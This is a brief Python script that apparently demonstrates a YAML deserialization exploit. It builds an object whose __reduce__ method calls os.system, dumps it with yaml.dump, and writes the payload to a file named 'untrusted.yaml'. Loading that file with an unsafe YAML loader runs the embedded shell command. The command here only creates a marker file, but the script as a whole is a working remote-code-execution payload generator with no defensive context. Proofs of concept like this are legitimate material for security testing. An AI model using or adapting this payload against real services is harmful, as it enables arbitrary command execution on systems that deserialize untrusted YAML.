import yaml
import os

class MyExploit(object):
    def __reduce__(object):
        command = 'touch GENERIC-EXPLOIT-WORKS-AS-WELL'
        return (os.system, (command, ))


serialized = yaml.dump(MyExploit())
filename = 'untrusted.yaml'

with open(filename, 'w') as file_object:
    file_object.write(serialized)
